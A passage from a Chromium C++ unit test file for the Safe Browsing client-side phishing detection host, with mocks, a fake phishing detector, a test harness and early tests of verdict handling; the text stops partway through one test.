// Copyright 2012 The Chromium Authors
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

#include <memory>
#include <optional>
#include <tuple>
#include <utility>

#include "base/files/file_path.h"
#include "base/files/file_util.h"
#include "base/functional/bind.h"
#include "base/functional/callback_helpers.h"
#include "base/memory/raw_ptr.h"
#include "base/memory/read_only_shared_memory_region.h"
#include "base/memory/ref_counted.h"
#include "base/metrics/statistics_recorder.h"
#include "base/run_loop.h"
#include "base/strings/string_number_conversions.h"
#include "base/test/gmock_callback_support.h"
#include "base/test/gmock_move_support.h"
#include "base/test/metrics/histogram_tester.h"
#include "base/test/scoped_command_line.h"
#include "base/test/scoped_feature_list.h"
#include "base/test/simple_test_tick_clock.h"
#include "base/test/test_future.h"
#include "chrome/browser/history/history_service_factory.h"
#include "chrome/browser/safe_browsing/chrome_client_side_detection_host_delegate.h"
#include "chrome/browser/safe_browsing/chrome_safe_browsing_blocking_page_factory.h"
#include "chrome/browser/safe_browsing/chrome_ui_manager_delegate.h"
#include "chrome/browser/safe_browsing/verdict_cache_manager_factory.h"
#include "chrome/common/url_constants.h"
#include "chrome/test/base/chrome_render_view_host_test_harness.h"
#include "chrome/test/base/testing_profile.h"
#include "components/autofill/content/browser/content_autofill_client.h"
#include "components/autofill/content/browser/test_autofill_client_injector.h"
#include "components/autofill/content/browser/test_autofill_driver_injector.h"
#include "components/autofill/content/browser/test_autofill_manager_injector.h"
#include "components/autofill/content/browser/test_content_autofill_client.h"
#include "components/autofill/content/browser/test_content_autofill_driver.h"
#include "components/autofill/core/browser/field_types.h"
#include "components/autofill/core/browser/form_structure.h"
#include "components/autofill/core/browser/foundations/test_autofill_client.h"
#include "components/autofill/core/browser/foundations/test_autofill_driver.h"
#include "components/autofill/core/browser/foundations/test_browser_autofill_manager.h"
#include "components/autofill/core/browser/test_utils/autofill_form_test_utils.h"
#include "components/autofill/core/common/autofill_test_utils.h"
#include "components/history/core/browser/history_database_params.h"
#include "components/history/core/browser/history_service.h"
#include "components/history/core/test/test_history_database.h"
#include "components/permissions/test/mock_permission_prompt_factory.h"
#include "components/permissions/test/mock_permission_request.h"
#include "components/prefs/scoped_user_pref_update.h"
#include "components/safe_browsing/content/browser/async_check_tracker.h"
#include "components/safe_browsing/content/browser/client_side_detection_feature_cache.h"
#include "components/safe_browsing/content/browser/client_side_detection_service.h"
#include "components/safe_browsing/content/browser/client_side_phishing_model.h"
#include "components/safe_browsing/content/browser/content_unsafe_resource_util.h"
#include "components/safe_browsing/content/browser/credit_card_form_event.h"
#include "components/safe_browsing/content/browser/ui_manager.h"
#include "components/safe_browsing/content/browser/url_checker_holder.h"
#include "components/safe_browsing/content/common/safe_browsing.mojom-shared.h"
#include "components/safe_browsing/core/browser/db/database_manager.h"
#include "components/safe_browsing/core/browser/db/test_database_manager.h"
#include "components/safe_browsing/core/browser/db/v4_protocol_manager_util.h"
#include "components/safe_browsing/core/browser/intelligent_scan_delegate.h"
#include "components/safe_browsing/core/browser/sync/sync_utils.h"
#include "components/safe_browsing/core/browser/verdict_cache_manager.h"
#include "components/safe_browsing/core/common/features.h"
#include "components/safe_browsing/core/common/proto/csd.pb.h"
#include "components/safe_browsing/core/common/safe_browsing_prefs.h"
#include "components/safe_browsing/core/common/threat_enums.h"
#include "components/security_interstitials/core/unsafe_resource.h"
#include "components/signin/public/identity_manager/identity_test_environment.h"
#include "content/public/browser/browser_task_traits.h"
#include "content/public/browser/browser_thread.h"
#include "content/public/browser/navigation_entry.h"
#include "content/public/browser/navigation_handle.h"
#include "content/public/browser/render_frame_host.h"
#include "content/public/browser/web_contents.h"
#include "content/public/test/browser_test_utils.h"
#include "content/public/test/mock_render_process_host.h"
#include "content/public/test/navigation_simulator.h"
#include "content/public/test/test_renderer_host.h"
#include "content/public/test/web_contents_tester.h"
#include "mojo/public/cpp/base/proto_wrapper.h"
#include "mojo/public/cpp/bindings/associated_receiver_set.h"
#include "mojo/public/cpp/bindings/pending_receiver.h"
#include "net/http/http_status_code.h"
#include "services/network/public/cpp/shared_url_loader_factory.h"
#include "testing/gmock/include/gmock/gmock.h"
#include "testing/gtest/include/gtest/gtest.h"
#include "third_party/blink/public/common/associated_interfaces/associated_interface_provider.h"
#include "url/gurl.h"

#if BUILDFLAG(IS_ANDROID)
#include "components/safe_browsing/core/browser/referring_app_info.h"
#endif

using base::test::RunOnceClosure;
using base::test::TestFuture;
using content::BrowserThread;
using content::RenderFrameHostTester;
using content::WebContents;
using ::testing::_;
using ::testing::DeleteArg;
using ::testing::DoAll;
using ::testing::Eq;
using ::testing::IsNull;
using ::testing::Mock;
using ::testing::NiceMock;
using ::testing::NotNull;
using ::testing::Pointee;
using ::testing::Return;
using ::testing::ReturnRef;
using ::testing::SaveArg;
using ::testing::SetArgPointee;
using ::testing::StrictMock;

namespace {

const bool kFalse = false;
const bool kTrue = true;

void WaitUntilHighConfidenceAllowlistCheckDone() {
  base::StatisticsRecorder::HistogramWaiter(
      "SBClientPhishing.MatchHighConfidenceAllowlist")
      .Wait();
}

}  // namespace

namespace safe_browsing {
namespace {

class MockSafeBrowsingTokenFetcher : public SafeBrowsingTokenFetcher {
 public:
  MockSafeBrowsingTokenFetcher() = default;

  MockSafeBrowsingTokenFetcher(const MockSafeBrowsingTokenFetcher&) = delete;
  MockSafeBrowsingTokenFetcher& operator=(const MockSafeBrowsingTokenFetcher&) =
      delete;

  ~MockSafeBrowsingTokenFetcher() override = default;

  MOCK_METHOD1(Start, void(Callback));
  MOCK_METHOD1(OnInvalidAccessToken, void(const std::string&));
};

// This matcher verifies that the client computed verdict
// (ClientPhishingRequest) which is passed to SendClientReportPhishingRequest
// has the expected fields set.  Note: we can't simply compare the protocol
// buffer strings because the BrowserFeatureExtractor might add features to the
// verdict object before calling SendClientReportPhishingRequest.
MATCHER_P(PartiallyEqualVerdict, other, "") {
  return (other.url() == arg->url() &&
          other.client_score() == arg->client_score() &&
          other.is_phishing() == arg->is_phishing());
}

MATCHER_P(HasScamThreatSubtype, other, "") {
  return (other.threat_subtype == arg.threat_subtype);
}

MATCHER(EmptyLlamForcedTriggerInfoVerdict, "") {
  return !arg->has_llama_forced_trigger_info();
}

MATCHER(IntelligentScanEnabledVerdict, "") {
  return arg->has_llama_forced_trigger_info() &&
         arg->llama_forced_trigger_info().intelligent_scan();
}

// Test that the callback is nullptr when the verdict is not phishing.
MATCHER(CallbackIsNull, "") {
  return arg.is_null();
}

class MockClientSideDetectionService : public ClientSideDetectionService {
 public:
  MockClientSideDetectionService()
      : ClientSideDetectionService(nullptr, nullptr) {}

  MockClientSideDetectionService(const MockClientSideDetectionService&) =
      delete;
  MockClientSideDetectionService& operator=(
      const MockClientSideDetectionService&) = delete;

  ~MockClientSideDetectionService() override = default;

  MOCK_METHOD3(SendClientReportPhishingRequest,
               void(std::unique_ptr<ClientPhishingRequest>,
                    ClientReportPhishingRequestCallback,
                    const std::string&));
  MOCK_CONST_METHOD1(IsPrivateIPAddress, bool(const net::IPAddress&));
  MOCK_METHOD2(GetValidCachedResult, bool(const GURL&, bool*));
  MOCK_METHOD0(AtPhishingReportLimit, bool());
  MOCK_METHOD0(GetModelSharedMemoryRegion, base::ReadOnlySharedMemoryRegion());
  MOCK_METHOD0(GetModelType, CSDModelType());
  MOCK_METHOD0(IsModelAvailable, bool());
  MOCK_METHOD0(HasImageEmbeddingModel, bool());
  MOCK_METHOD0(IsModelMetadataImageEmbeddingVersionMatching, bool());
};

class MockSafeBrowsingUIManager : public SafeBrowsingUIManager {
 public:
  MockSafeBrowsingUIManager()
      : SafeBrowsingUIManager(
            std::make_unique<ChromeSafeBrowsingUIManagerDelegate>(),
            std::make_unique<ChromeSafeBrowsingBlockingPageFactory>(),
            chrome::ChromeUINewTabURLAsGURL()) {}

  MockSafeBrowsingUIManager(const MockSafeBrowsingUIManager&) = delete;
  MockSafeBrowsingUIManager& operator=(const MockSafeBrowsingUIManager&) =
      delete;

  MOCK_METHOD1(DisplayBlockingPage, void(const UnsafeResource& resource));

 protected:
  ~MockSafeBrowsingUIManager() override = default;
};

class MockSafeBrowsingDatabaseManager : public TestSafeBrowsingDatabaseManager {
 public:
  MockSafeBrowsingDatabaseManager()
      : safe_browsing::TestSafeBrowsingDatabaseManager(
            content::GetUIThreadTaskRunner({})) {}

  MockSafeBrowsingDatabaseManager(const MockSafeBrowsingDatabaseManager&) =
      delete;
  MockSafeBrowsingDatabaseManager& operator=(
      const MockSafeBrowsingDatabaseManager&) = delete;

  MOCK_METHOD2(CheckCsdAllowlistUrl,
               AsyncMatch(const GURL&, SafeBrowsingDatabaseManager::Client*));
  MOCK_CONST_METHOD1(CanCheckUrl, bool(const GURL&));

  // Calls the callback with the allowlist match result previously set by
  // |SetAllowlistLookupDetailsForUrl|. Returns std::nullopt. It crashes if
  // the allowlist match result is not set in advance for the |gurl|.
  void CheckUrlForHighConfidenceAllowlist(
      const GURL& gurl,
      CheckUrlForHighConfidenceAllowlistCallback callback) override {
    std::string url = gurl.spec();
    DCHECK(urls_allowlist_match_.contains(url));

    ui_task_runner()->PostTask(
        FROM_HERE,
        base::BindOnce(
            std::move(callback),
            /*url_on_high_confidence_allowlist=*/urls_allowlist_match_[url],
            /*logging_details=*/std::nullopt));
  }

  void SetAllowlistLookupDetailsForUrl(const GURL& gurl, bool match) {
    std::string url = gurl.spec();
    urls_allowlist_match_[url] = match;
  }

 protected:
  ~MockSafeBrowsingDatabaseManager() override = default;

 private:
  base::flat_map<std::string, bool> urls_allowlist_match_;
};

class MockClientSideDetectionHostDelegate
    : public ChromeClientSideDetectionHostDelegate {
 public:
  explicit MockClientSideDetectionHostDelegate(
      content::WebContents* web_contents)
      : ChromeClientSideDetectionHostDelegate(web_contents) {}

  void GetInnerText(HostInnerTextCallback callback) override {
    std::move(callback).Run(inner_text_);
  }

  void ForceEmptyInnerText() { inner_text_ = ""; }

  void SetInnerText(std::string inner_text) { inner_text_ = inner_text; }

#if BUILDFLAG(IS_ANDROID)
  internal::ReferringAppInfo GetReferringAppInfo(
      content::WebContents* web_contents) override {
    return referring_app_info_;
  }

  void SetReferringAppName(std::string referring_app_name) {
    internal::ReferringAppInfo info;
    info.referring_app_name = referring_app_name;
    referring_app_info_ = info;
  }
#endif

 private:
  std::string inner_text_ = "inner text";
#if BUILDFLAG(IS_ANDROID)
  internal::ReferringAppInfo referring_app_info_;
#endif
};

class MockIntelligentScanDelegate : public IntelligentScanDelegate {
 public:
  MOCK_METHOD(bool,
              ShouldRequestIntelligentScan,
              (ClientPhishingRequest*),
              (override));
  MOCK_METHOD(ModelType, GetIntelligentScanModelType, (bool), (override));
  MOCK_METHOD(std::optional<base::UnguessableToken>,
              StartIntelligentScan,
              (std::string, IntelligentScanDoneCallback),
              (override));
  MOCK_METHOD(bool,
              CancelIntelligentScan,
              (const base::UnguessableToken&),
              (override));
  MOCK_METHOD(bool,
              ShouldShowScamWarning,
              (std::optional<IntelligentScanVerdict>),
              (override));
  MOCK_METHOD(void, OnScamWarningShown, (), (override));
};

std::string ToString(credit_card_form::ReferringApp referring_app) {
  switch (referring_app) {
    case credit_card_form::kNoReferringApp:
      return "NoReferringApp";
    case credit_card_form::kChrome:
      return "Chrome";
    case credit_card_form::kSmsApp:
      return "SmsApp";
    case credit_card_form::kOtherApp:
      return "OtherApp";
  }
}

}  // namespace

class FakePhishingDetector : public mojom::PhishingDetector {
 public:
  FakePhishingDetector() = default;

  FakePhishingDetector(const FakePhishingDetector&) = delete;
  FakePhishingDetector& operator=(const FakePhishingDetector&) = delete;

  ~FakePhishingDetector() override { Reset(); }

  void BindReceiver(mojo::ScopedInterfaceEndpointHandle handle) {
    receivers_.Add(this,
                   mojo::PendingAssociatedReceiver<mojom::PhishingDetector>(
                       std::move(handle)));
  }

  // mojom::PhishingDetector
  void StartPhishingDetection(
      const GURL& url,
      safe_browsing::mojom::ClientSideDetectionType request_type,
      StartPhishingDetectionCallback callback) override {
    url_ = url;
    request_type_ = request_type;
    phishing_detection_started_ = true;
    phishing_detection_start_count_++;
    if (hold_phishing_detection_callback_) {
      held_phishing_detection_callback_ = std::move(callback);
      return;
    }

    // The callback must be run before destruction, so send a minimal
    // ClientPhishingRequest.
    ClientPhishingRequest request;
    request.set_client_score(0.8);
    std::move(callback).Run(mojom::PhishingDetectorResult::SUCCESS,
                            mojo_base::ProtoWrapper(request));
    return;
  }

  void CheckMessage(const GURL* url) {
    if (!url) {
      EXPECT_FALSE(phishing_detection_started_);
    } else {
      ASSERT_TRUE(phishing_detection_started_);
      EXPECT_EQ(*url, url_);
    }
  }

  void Reset() {
    phishing_detection_started_ = false;
    phishing_detection_start_count_ = 0;
    url_ = GURL();
    request_type_ = std::nullopt;
    if (held_phishing_detection_callback_) {
      std::move(held_phishing_detection_callback_)
          .Run(mojom::PhishingDetectorResult::CANCELLED, std::nullopt);
    }
  }

  bool phishing_detection_started() const {
    return phishing_detection_started_;
  }

  std::optional<safe_browsing::mojom::ClientSideDetectionType>
  last_request_type() const {
    return request_type_;
  }

  int phishing_detection_start_count() const {
    return phishing_detection_start_count_;
  }

  void set_hold_phishing_detection_callback(bool hold) {
    hold_phishing_detection_callback_ = hold;
  }

  void RunHeldPhishingDetectionCallback() {
    ClientPhishingRequest request;
    request.set_client_score(0.8);
    std::move(held_phishing_detection_callback_)
        .Run(mojom::PhishingDetectorResult::SUCCESS,
             mojo_base::ProtoWrapper(request));
  }

 private:
  mojo::AssociatedReceiverSet<mojom::PhishingDetector> receivers_;
  bool phishing_detection_started_ = false;
  int phishing_detection_start_count_ = 0;
  GURL url_;
  std::optional<safe_browsing::mojom::ClientSideDetectionType> request_type_;
  bool hold_phishing_detection_callback_ = false;
  StartPhishingDetectionCallback held_phishing_detection_callback_;
};

class ClientSideDetectionHostTestBase : public ChromeRenderViewHostTestHarness {
 public:
  typedef security_interstitials::UnsafeResource UnsafeResource;

  class WebContentsObserver : public content::WebContentsObserver {
   public:
    WebContentsObserver(ClientSideDetectionHostTestBase* harness,
                        content::WebContents* contents)
        : content::WebContentsObserver(contents), harness_(harness) {}

    void RenderFrameCreated(
        content::RenderFrameHost* render_frame_host) override {
      harness_->InitTestApi(render_frame_host);
    }

   private:
    // The raw pointer is safe because `harness_` owns this.
    raw_ptr<ClientSideDetectionHostTestBase> harness_;
  };

  explicit ClientSideDetectionHostTestBase(bool is_incognito)
      : is_incognito_(is_incognito) {}

  void InitTestApi(content::RenderFrameHost* rfh) {
    rfh->GetRemoteAssociatedInterfaces()->OverrideBinderForTesting(
        mojom::PhishingDetector::Name_,
        base::BindRepeating(&FakePhishingDetector::BindReceiver,
                            base::Unretained(&fake_phishing_detector_)));
  }

  void SetUp() override {
    if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
      // Note that on builds that use DBus, TearDown after GTEST_SKIP may crash
      // in a way that does not register as a build failure. See b/490133826 and
      // b/462607324 tracking the root cause.
      GTEST_SKIP();
    }
    ChromeRenderViewHostTestHarness::SetUp();

    observer_ = std::make_unique<WebContentsObserver>(this, web_contents());

    if (is_incognito_) {
      auto incognito_web_contents =
          content::WebContentsTester::CreateTestWebContents(
              profile()->GetPrimaryOTRProfile(/*create_if_needed=*/true),
              nullptr);
      SetContents(std::move(incognito_web_contents));
    }

    // Initiate the connection to a (pretend) renderer process.
    NavigateAndCommit(GURL("about:blank"));

    InitTestApi(web_contents()->GetPrimaryMainFrame());

    // Inject service classes.
    csd_service_ = std::make_unique<NiceMock<MockClientSideDetectionService>>();
    database_manager_ = new NiceMock<MockSafeBrowsingDatabaseManager>();
    ui_manager_ = new NiceMock<MockSafeBrowsingUIManager>();

    identity_test_env_.MakePrimaryAccountAvailable(
        "user@gmail.com", signin::ConsentLevel::kSignin);

    csd_host_ =
        ChromeClientSideDetectionHostDelegate::CreateHost(web_contents());
    csd_host_->set_client_side_detection_service(csd_service_->GetWeakPtr());
    csd_host_->set_ui_manager(ui_manager_.get());
    csd_host_->set_database_manager(database_manager_.get());
    csd_host_->set_tick_clock_for_testing(&clock_);
    csd_host_->set_is_off_the_record_for_testing(is_incognito_);
    csd_host_->set_account_signed_in_for_testing(
        base::BindRepeating(&safe_browsing::SyncUtils::IsPrimaryAccountSignedIn,
                            identity_test_env_.identity_manager()));
    auto token_fetcher =
        std::make_unique<NiceMock<MockSafeBrowsingTokenFetcher>>();
    raw_token_fetcher_ = token_fetcher.get();
    csd_host_->set_token_fetcher_for_testing(std::move(token_fetcher));
    auto delegate =
        std::make_unique<MockClientSideDetectionHostDelegate>(web_contents());
    raw_delegate_ = delegate.get();
    csd_host_->set_delegate_for_testing(std::move(delegate));
    intelligent_scan_delegate_ =
        std::make_unique<NiceMock<MockIntelligentScanDelegate>>();
    csd_host_->set_intelligent_scan_delegate_for_testing(
        intelligent_scan_delegate_.get());
    // Commit to a URL for tests that do not explicitly NavigateAndCommit.
    // Committing to "about:blank" avoids triggering logic irrelevant for tests.
    NavigateAndCommit(GURL("about:blank"));

    testing::DefaultValue<CSDModelType>::Set(CSDModelType::kFlatbuffer);
    setup_called_ = true;
  }

  void TearDown() override {
    if (!setup_called_) {
      return;
    }
    raw_token_fetcher_ = nullptr;
    raw_delegate_ = nullptr;

    csd_host_.reset();
    csd_service_.reset();
    intelligent_scan_delegate_.reset();
    database_manager_.reset();
    ui_manager_.reset();

    ChromeRenderViewHostTestHarness::TearDown();
  }

  void PhishingDetectionDone(std::optional<mojo_base::ProtoWrapper> verdict,
                             ClientSideDetectionType csd_type =
                                 ClientSideDetectionType::TRIGGER_MODELS) {
    csd_host_->PhishingDetectionDone(
        csd_type,
        /*is_sample_ping=*/false, /*did_match_high_confidence_allowlist=*/false,
        /*is_invalid_ip=*/false, clock_.NowTicks(),
        mojom::PhishingDetectorResult::SUCCESS, std::move(verdict));
  }

  void PhishingDetectionDoneWithHighConfidenceAllowlistMatch(
      std::optional<mojo_base::ProtoWrapper> verdict) {
    csd_host_->PhishingDetectionDone(
        ClientSideDetectionType::TRIGGER_MODELS,
        /*is_sample_ping=*/false, /*did_match_high_confidence_allowlist=*/true,
        /*is_invalid_ip=*/false, clock_.NowTicks(),
        mojom::PhishingDetectorResult::SUCCESS, std::move(verdict));
  }

  void PhishingDetectionError(mojom::PhishingDetectorResult error) {
    csd_host_->PhishingDetectionDone(
        ClientSideDetectionType::TRIGGER_MODELS,
        /*is_sample_ping=*/false, /*did_match_high_confidence_allowlist=*/false,
        /*is_invalid_ip=*/false, clock_.NowTicks(), error, std::nullopt);
  }

  void ExpectPreClassificationChecks(
      const GURL& url,
      const bool* is_private = nullptr,
      const bool* match_csd_allowlist = nullptr,
      const bool* get_valid_cached_result = nullptr,
      const bool* over_phishing_report_limit = nullptr) {
    if (is_private) {
      EXPECT_CALL(*csd_service_, IsPrivateIPAddress(_))
          .WillOnce(Return(*is_private));
    }
    if (match_csd_allowlist) {
      EXPECT_CALL(*database_manager_.get(), CheckCsdAllowlistUrl(url, _))
          .WillOnce(Return(*match_csd_allowlist ? AsyncMatch::MATCH
                                                : AsyncMatch::NO_MATCH));
      EXPECT_CALL(*database_manager_.get(), CanCheckUrl(_))
          .WillOnce(Return(true));
    } else {
      EXPECT_CALL(*database_manager_.get(), CheckCsdAllowlistUrl(url, _))
          .Times(0);
    }
    if (get_valid_cached_result) {
      EXPECT_CALL(*csd_service_, GetValidCachedResult(url, NotNull()))
          .WillOnce(
              DoAll(SetArgPointee<1>(true), Return(*get_valid_cached_result)));
    }
    if (over_phishing_report_limit) {
      EXPECT_CALL(*csd_service_, AtPhishingReportLimit())
          .WillOnce(Return(*over_phishing_report_limit));
    }

    pre_classification_run_loop_ = std::make_unique<base::RunLoop>();
    pre_classification_histogram_observer_ = std::make_unique<
        base::StatisticsRecorder::ScopedHistogramSampleObserver>(
        "SBClientPhishing.PreClassificationCheckResult",
        base::IgnoreArgs<std::string_view, uint64_t,
                         base::HistogramBase::Sample32>(
            pre_classification_run_loop_->QuitClosure()));
  }

  // Wait for the preclassification check histogram to be logged, then
  // flush the generated IPC (if it exists).
  void WaitAndCheckPreClassificationChecks() {
    if (!pre_classification_run_loop_->AnyQuitCalled()) {
      pre_classification_run_loop_->Run();
    }
    if (csd_host_->phishing_detector_) {
      csd_host_->phishing_detector_.FlushForTesting();
    }
  }

  void NotifyClientSideDetectionObservers() {
    content::WebContentsTester::For(web_contents())
        ->TestDidFirstVisuallyNonEmptyPaint();
    if (csd_host_) {
      csd_host_->OnFirstContentfulPaintInPrimaryMainFrame();
    }
  }

  void NavigateAndCommit(const GURL& safe_url,
                         bool reverse_callback_order = false) {
    controller().LoadURL(safe_url, content::Referrer(),
                         ui::PAGE_TRANSITION_LINK, std::string());
    content::WebContentsTester::For(web_contents())->CommitPendingNavigation();
    if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
      if (!reverse_callback_order) {
        NotifyClientSideDetectionObservers();
      } else {
        if (csd_host_) {
          csd_host_->OnFirstContentfulPaintInPrimaryMainFrame();
        }
        content::WebContentsTester::For(web_contents())
            ->TestDidFirstVisuallyNonEmptyPaint();
      }
    }
  }

  void AdvanceTimeTickClock(base::TimeDelta delta) { clock_.Advance(delta); }

  void SetFeatures(
      const std::vector<base::test::FeatureRef>& enabled_features,
      const std::vector<base::test::FeatureRef>& disabled_features) {
    feature_list_.InitWithFeatures(enabled_features, disabled_features);
  }

  void SetForceRequestInCache(bool force_request) {
    VerdictCacheManager* cache_manager =
        VerdictCacheManagerFactory::GetForProfile(
            Profile::FromBrowserContext(web_contents()->GetBrowserContext()));
    RTLookupResponse response;

    RTLookupResponse::ThreatInfo* threat_info = response.add_threat_info();
    threat_info->set_verdict_type(RTLookupResponse::ThreatInfo::DANGEROUS);
    threat_info->set_threat_type(
        RTLookupResponse::ThreatInfo::SOCIAL_ENGINEERING);
    threat_info->set_cache_duration_sec(60);
    threat_info->set_cache_expression_using_match_type("example.com/");
    threat_info->set_cache_expression_match_type(
        RTLookupResponse::ThreatInfo::EXACT_MATCH);

    response.set_client_side_detection_type(
        force_request ? safe_browsing::ClientSideDetectionType::FORCE_REQUEST
                      : safe_browsing::ClientSideDetectionType::
                            CLIENT_SIDE_DETECTION_TYPE_UNSPECIFIED);
    cache_manager->CacheRealTimeUrlVerdict(response, base::Time::Now());
  }

  static std::string GetRequestTypeName(
      ClientSideDetectionType client_side_detection_type) {
    switch (client_side_detection_type) {
      case safe_browsing::ClientSideDetectionType::
          CLIENT_SIDE_DETECTION_TYPE_UNSPECIFIED:
        return "Unknown";
      case safe_browsing::ClientSideDetectionType::FORCE_REQUEST:
        return "ForceRequest";
      case safe_browsing::ClientSideDetectionType::
          NOTIFICATION_PERMISSION_PROMPT:
        return "NotificationPermissionPrompt";
      case safe_browsing::ClientSideDetectionType::TRIGGER_MODELS:
        return "TriggerModel";
      case safe_browsing::ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED:
        return "KeyboardLockRequested";
      case safe_browsing::ClientSideDetectionType::POINTER_LOCK_REQUESTED:
        return "PointerLockRequested";
      case safe_browsing::ClientSideDetectionType::VIBRATION_API:
        return "VibrationApi";
      case safe_browsing::ClientSideDetectionType::FULLSCREEN_API:
        return "FullscreenApi";
      case safe_browsing::ClientSideDetectionType::CLIPBOARD_COPY_API:
        return "ClipboardCopyApi";
      case safe_browsing::ClientSideDetectionType::CREDIT_CARD_FORM:
        return "CreditCardForm";
      case safe_browsing::ClientSideDetectionType::IMAGE_EMBEDDING_MATCH:
        return "ImageEmbeddingMatch";
      case safe_browsing::ClientSideDetectionType::USER_REPORT:
        return "UserReport";
      case safe_browsing::ClientSideDetectionType::UNFAMILIAR_LOGIN_PAGE:
        return "UnfamiliarLoginPage";
    }
  }

 protected:
  void SetHighConfidenceAllowlistAcceptanceRate(float acceptance_rate) {
    csd_host_->set_high_confidence_allowlist_acceptance_rate_for_testing(
        acceptance_rate);
  }

  void OnCreditCardFormVisitCountForTesting(
      std::optional<base::TimeTicks> start_time,
      credit_card_form::FieldDetectionHeuristic field_heuristic,
      std::string event_name,
      bool should_trigger,
      history::DailyVisitsResult history_result) {
    csd_host_->OnCreditCardFormVisitCount(start_time, field_heuristic,
                                          event_name, should_trigger,
                                          history_result);
  }

  std::unique_ptr<ClientSideDetectionHost> csd_host_;
  std::unique_ptr<NiceMock<MockClientSideDetectionService>> csd_service_;
  scoped_refptr<NiceMock<MockSafeBrowsingUIManager>> ui_manager_;
  scoped_refptr<NiceMock<MockSafeBrowsingDatabaseManager>> database_manager_;
  FakePhishingDetector fake_phishing_detector_;
  raw_ptr<NiceMock<MockSafeBrowsingTokenFetcher>> raw_token_fetcher_ = nullptr;
  raw_ptr<MockClientSideDetectionHostDelegate> raw_delegate_ = nullptr;
  std::unique_ptr<NiceMock<MockIntelligentScanDelegate>>
      intelligent_scan_delegate_;
  base::SimpleTestTickClock clock_;
  const bool is_incognito_;
  signin::IdentityTestEnvironment identity_test_env_;
  base::test::ScopedFeatureList feature_list_;
  std::unique_ptr<WebContentsObserver> observer_;

  // Used to synchronize waiting for pre-classification to complete.
  std::unique_ptr<base::RunLoop> pre_classification_run_loop_;
  std::unique_ptr<base::StatisticsRecorder::ScopedHistogramSampleObserver>
      pre_classification_histogram_observer_;
  bool setup_called_ = false;
};

class ClientSideDetectionHostTest : public ClientSideDetectionHostTestBase {
 public:
  ClientSideDetectionHostTest()
      : ClientSideDetectionHostTestBase(false /*is_incognito*/) {}
};

class ClientSideDetectionHostIncognitoTest
    : public ClientSideDetectionHostTestBase {
 public:
  ClientSideDetectionHostIncognitoTest()
      : ClientSideDetectionHostTestBase(true /*is_incognito*/) {}
};

struct ClientSideDetectionHostOnlyESBTestParams {
  bool is_esb_enabled;
  bool is_feature_enabled;
  bool is_new_observers_enabled;
};

class ClientSideDetectionHostOnlyESBTest
    : public ClientSideDetectionHostTestBase,
      public testing::WithParamInterface<
          ClientSideDetectionHostOnlyESBTestParams> {
 public:
  ClientSideDetectionHostOnlyESBTest()
      : ClientSideDetectionHostTestBase(false /*is_incognito*/) {}

  void SetUp() override {
    ClientSideDetectionHostTestBase::SetUp();
    SetEnhancedProtectionPrefForTests(profile()->GetPrefs(),
                                      GetParam().is_esb_enabled);
    std::vector<base::test::FeatureRef> enabled_features;
    std::vector<base::test::FeatureRef> disabled_features;

    if (GetParam().is_feature_enabled) {
      enabled_features.push_back(kClientSideDetectionOnlyESBClassification);
    } else {
      disabled_features.push_back(kClientSideDetectionOnlyESBClassification);
    }

    if (GetParam().is_new_observers_enabled) {
      enabled_features.push_back(kClientSideDetectionNewObservers);
    } else {
      disabled_features.push_back(kClientSideDetectionNewObservers);
    }

    feature_list_.InitWithFeatures(enabled_features, disabled_features);
  }
};

TEST_P(ClientSideDetectionHostOnlyESBTest,
       TestPreClassificationCheckOnlyESBClassification) {
  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);

  if (GetParam().is_feature_enabled && !GetParam().is_esb_enabled) {
    // Should NOT trigger any classification.
    EXPECT_CALL(*csd_service_, IsPrivateIPAddress(_)).Times(0);
    EXPECT_CALL(*database_manager_.get(), CheckCsdAllowlistUrl(url, _))
        .Times(0);
    NavigateAndCommit(url);
    base::RunLoop().RunUntilIdle();
    fake_phishing_detector_.CheckMessage(nullptr);
  } else if (GetParam().is_feature_enabled && GetParam().is_esb_enabled) {
    // Should trigger classification.
    ExpectPreClassificationChecks(url, &kFalse, &kFalse, &kFalse, &kFalse);
    NavigateAndCommit(url);
    WaitAndCheckPreClassificationChecks();
    fake_phishing_detector_.CheckMessage(&url);
  }
}

INSTANTIATE_TEST_SUITE_P(
    All,
    ClientSideDetectionHostOnlyESBTest,
    testing::Values(ClientSideDetectionHostOnlyESBTestParams{
                        /*is_esb_enabled=*/false,
                        /*is_feature_enabled=*/false,
                        /*is_new_observers_enabled=*/false},
                    ClientSideDetectionHostOnlyESBTestParams{
                        /*is_esb_enabled=*/false,
                        /*is_feature_enabled=*/false,
                        /*is_new_observers_enabled=*/true},
                    ClientSideDetectionHostOnlyESBTestParams{
                        /*is_esb_enabled=*/false,
                        /*is_feature_enabled=*/true,
                        /*is_new_observers_enabled=*/false},
                    ClientSideDetectionHostOnlyESBTestParams{
                        /*is_esb_enabled=*/false,
                        /*is_feature_enabled=*/true,
                        /*is_new_observers_enabled=*/true},
                    ClientSideDetectionHostOnlyESBTestParams{
                        /*is_esb_enabled=*/true,
                        /*is_feature_enabled=*/false,
                        /*is_new_observers_enabled=*/false},
                    ClientSideDetectionHostOnlyESBTestParams{
                        /*is_esb_enabled=*/true,
                        /*is_feature_enabled=*/false,
                        /*is_new_observers_enabled=*/true},
                    ClientSideDetectionHostOnlyESBTestParams{
                        /*is_esb_enabled=*/true,
                        /*is_feature_enabled=*/true,
                        /*is_new_observers_enabled=*/false},
                    ClientSideDetectionHostOnlyESBTestParams{
                        /*is_esb_enabled=*/true,
                        /*is_feature_enabled=*/true,
                        /*is_new_observers_enabled=*/true}));

TEST_F(ClientSideDetectionHostTest, PhishingDetectionDoneInvalidVerdict) {
  // Case 0: renderer sends an invalid protobuf that we're unable to
  // parse. This has the same behavior as providing nullopt.
  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(_, _, _)).Times(0);
  PhishingDetectionDone(std::nullopt);
  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));
}

TEST_F(ClientSideDetectionHostTest, PhishingDetectionDoneNotPhishing) {
  // Case 1: client thinks the page is phishing.  The server does not agree.
  // No interstitial is shown.
  ClientSideDetectionService::ClientReportPhishingRequestCallback cb;
  ClientPhishingRequest verdict;
  verdict.set_url("http://phishingurl.com/");
  verdict.set_client_score(1.0f);
  verdict.set_is_phishing(true);

